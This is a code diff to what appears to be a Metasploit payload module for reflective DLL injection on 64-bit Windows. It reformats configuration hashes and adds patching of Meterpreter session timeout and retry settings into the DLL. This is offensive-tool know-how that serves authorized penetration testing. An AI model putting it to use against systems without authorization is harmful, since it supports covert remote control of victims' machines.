@@ -29,17 +29,10 @@ module Payload::Windows::ReflectiveDllInject_x64
       ],
       'Platform'      => 'win',
       'Arch'          => ARCH_X86_64,
-      'PayloadCompat' =>
-        {
-          'Convention' => 'sockrdi'
-        },
-      'Stage'         =>
-        {
-          'Offsets' =>
-            {
-              'EXITFUNC' => [ 47, 'V' ]
-            },
-          'Payload' => ""
+      'PayloadCompat' => { 'Convention' => 'sockrdi' },
+      'Stage'         => {
+          'Offsets'   => { 'EXITFUNC' => [ 47, 'V' ] },
+          'Payload'   => ""
         }
       ))
 
@@ -80,6 +73,16 @@ module Payload::Windows::ReflectiveDllInject_x64
       print_error( "Reflective Dll Injection (x64) generated an oversized bootstrap!" )
       return
     end
+
+    # patch in the timeout options
+    timeout_opts = {
+      :expiration   => datastore['SessionExpirationTimeout'].to_i,
+      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
+      :retry_total  => datastore['SessionRetryTotal'].to_i,
+      :retry_wait   => datastore['SessionRetryWait'].to_i,
+    }
+
+    Rex::Payloads::Meterpreter::Patch.patch_timeouts!(dll, timeout_opts)
 
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
